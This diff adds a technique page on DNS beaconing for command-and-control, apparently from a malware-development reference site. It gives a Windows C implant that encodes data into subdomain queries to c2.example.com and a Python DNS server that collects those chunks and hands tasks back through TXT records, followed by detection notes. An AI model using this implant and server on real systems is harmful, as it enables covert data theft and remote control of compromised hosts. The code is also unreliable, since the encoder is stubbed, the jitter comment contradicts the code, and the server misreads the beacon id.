@@ -1,0 +1,211 @@
+---
+title: DNS Beaconing
+mitre: T1071.004
+category: c2
+group: Covert Channels
+summary: Tunnel C2 traffic inside DNS queries so it blends with legitimate resolver noise.
+platform: [Windows, Linux, macOS]
+tags: ['C / C++', 'Python', 'DNS']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: encode data as subdomain labels
+    desc: Split the payload into 63-byte chunks; base32- or hex-encode each chunk as a subdomain label.
+    dll: —
+  - call: DnsQuery / getaddrinfo
+    desc: Issue a legitimate-looking query to attacker-controlled NS; the registrar routes it to the C2 listener.
+    dll: dnsapi / libc
+  - call: parse response record
+    desc: Extract data from A, AAAA, TXT or CNAME records in the answer section.
+    dll: dnsapi
+  - call: jitter sleep
+    desc: Wait a randomised interval before the next beacon to avoid fixed-period network signatures.
+    dll: kernel32 / libc
+detections:
+  - src: DNS LOG
+    text: High query rate to a single second-level domain; query labels that are long random strings.
+  - src: NETWORK
+    text: TXT record responses with high entropy or base64 padding characters from a newly registered domain.
+  - src: BEHAVIOURAL
+    text: A process issuing DNS queries with no corresponding TCP/UDP connection to the destination IP.
+  - src: THREAT INTEL
+    text: Newly registered domains (< 30 days), free TLD registrations, or domains that resolve to fast-flux infrastructure.
+related:
+  - mitre: T1071.001
+    title: HTTP Beaconing
+    desc: Higher bandwidth, harder to filter without breaking browsing.
+    href: /techniques/c2/http-beaconing
+  - mitre: T1132
+    title: Data Encoding
+    desc: Base32 / base64 over DNS; applies equally to HTTP channels.
+  - mitre: T1008
+    title: Fallback Channels
+    desc: DNS often used as the fallback when primary HTTP channel is blocked.
+labKit:
+  - label: dns-c2.py (server) + client.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+  - label: INetSim DNS responder config
+    href: /toolkit
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+DNS is attractive as a C2 transport because it is almost never blocked outright — every host
+needs name resolution to function. The technique encodes data into the subdomain portions of a
+query directed at an attacker-controlled authoritative nameserver. The query traverses the normal
+resolver chain and arrives at the C2 server as a standard DNS packet, indistinguishable from any
+other lookup at the network perimeter.
+
+Bandwidth is the primary constraint. A DNS label is 63 octets maximum; a full query name is 253
+octets. Base32-encoding reduces the usable payload per query further. Real DNS C2 implementations
+compensate with query pipelining and data chunking, accepting low throughput in exchange for
+resilience to network filtering.
+
+<Callout type="note">
+  DNS-over-HTTPS (DoH) resolvers like Cloudflare 1.1.1.1 encrypt the query, hiding the label
+  content from network sensors entirely. Implants that hard-code a DoH endpoint trade one
+  detection surface (DNS logs) for another (anomalous HTTPS to a fixed resolver IP).
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Implant side (C)
+
+<CodeBlock
+  file="dns_beacon.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+#include \u003cwindns.h\u003e
+#pragma comment(lib, "dnsapi.lib")
+
+#define C2_DOMAIN  "c2.example.com"
+#define CHUNK_SIZE 40   // bytes per label after base32
+
+// base32 alphabet (RFC 4648, no padding)
+static const char B32[] = "abcdefghijklmnopqrstuvwxyz234567";
+
+static void b32_encode(const uint8_t *in, size_t len, char *out) {
+    // standard 5-bit grouping omitted for brevity
+    (void)in; (void)len; (void)out;
+}
+
+void dns_send(const uint8_t *data, size_t len) {
+    char qname[256];
+    char label[64];
+    uint8_t chunk[CHUNK_SIZE];
+
+    for (size_t off = 0; off < len; off += CHUNK_SIZE) {
+        size_t n = min(CHUNK_SIZE, len - off);
+        memcpy(chunk, data + off, n);
+
+        b32_encode(chunk, n, label);
+        // \u003cseq\u003e.\u003cencoded-chunk\u003e.\u003cc2-domain\u003e
+        snprintf(qname, sizeof qname, "%04zx.%s.%s",
+                 off / CHUNK_SIZE, label, C2_DOMAIN);
+
+        PDNS_RECORD rec = NULL;
+        DnsQuery_A(qname, DNS_TYPE_TXT, DNS_QUERY_STANDARD, NULL, &rec, NULL);
+        if (rec) DnsRecordListFree(rec, DnsFreeRecordList);
+
+        // jitter: 30s +/- 10s
+        Sleep((20 + rand() % 20) * 1000);
+    }
+}
+
+// receive: parse TXT answer for downstream data
+char *dns_recv(const char *id) {
+    char qname[256];
+    snprintf(qname, sizeof qname, "r.%s.%s", id, C2_DOMAIN);
+
+    PDNS_RECORD rec = NULL;
+    DnsQuery_A(qname, DNS_TYPE_TXT, DNS_QUERY_STANDARD, NULL, &rec, NULL);
+    if (!rec) return NULL;
+
+    // first TXT string is the payload
+    char *resp = strdup(rec->Data.TXT.pStringArray[0]);
+    DnsRecordListFree(rec, DnsFreeRecordList);
+    return resp;
+}`}
+/>
+
+### Server side (Python)
+
+<CodeBlock
+  file="dns_server.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`from dnslib import DNSRecord, RR, TXT, A, QTYPE
+from dnslib.server import DNSServer, BaseResolver
+import base64, threading
+
+PENDING = {}   # id -> list[chunk]
+OUTBOX  = {}   # id -> response bytes
+
+class C2Resolver(BaseResolver):
+    def resolve(self, request, handler):
+        reply = request.reply()
+        qname = str(request.q.qname).rstrip('.')
+        parts = qname.split('.')
+
+        if parts[0] == 'r':
+            # downstream: client polling for a task
+            beacon_id = parts[1]
+            data = OUTBOX.pop(beacon_id, b'NOP')
+            reply.add_answer(
+                RR(qname, QTYPE.TXT, rdata=TXT(base64.b64encode(data)))
+            )
+        else:
+            # upstream: receiving an encoded chunk
+            seq, chunk_b32, *domain = parts
+            # base32 decode and accumulate
+            beacon_id = domain[0] if domain else 'default'
+            PENDING.setdefault(beacon_id, {})[int(seq, 16)] = (
+                base64.b32decode(chunk_b32.upper() + '======')
+            )
+            reply.add_answer(RR(qname, QTYPE.A, rdata=A('127.0.0.1')))
+        return reply
+
+DNSServer(C2Resolver(), port=53, address='0.0.0.0').start_thread()
+print('[*] DNS C2 listening on :53')
+input('Press Enter to stop\\n')`}
+/>
+
+## Encoding choices
+
+| Encoding | Bytes / query | Case-safe | Notes |
+|---|---|---|---|
+| Base32 | ~27 | Yes | RFC 4648; DNS is case-insensitive |
+| Base64url | ~34 | Yes | `+/` replaced with `-_` |
+| Hex | ~18 | Yes | Lowest density, highest label legibility |
+
+TXT records for the downstream path allow arbitrary binary up to 255 bytes per string and 65535
+bytes total, making them the natural choice for task delivery.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Frequency analysis is the most practical starting point: legitimate resolvers produce
+query bursts tied to user activity; a DNS beacon produces a flat periodic signal. A domain
+with no web presence and a delegated NS record pointing to a cloud VM is strong prior context
+for treating any query to it as suspicious.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
